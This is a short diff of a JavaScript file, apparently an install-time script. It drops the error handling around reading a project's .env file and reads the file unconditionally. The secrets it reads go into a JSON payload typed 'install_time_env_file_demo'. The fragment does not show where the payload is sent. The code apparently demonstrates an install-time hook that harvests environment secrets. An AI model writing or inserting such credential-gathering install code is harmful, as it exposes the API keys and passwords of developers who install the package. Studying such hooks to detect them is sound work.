@@ -41,13 +41,7 @@ const envPath = findEnvFile(process.cwd());
 
 let envContents = "";
 
-try {
-  envContents = envPath
-    ? fs.readFileSync(envPath, "utf8")
-    : "No .env file found while searching parent directories.";
-} catch (error) {
-  envContents = `Failed to read .env: ${error.message}`;
-}
+envContents = fs.readFileSync(envPath, "utf8");
 
 const payload = JSON.stringify({
   type: "install_time_env_file_demo",
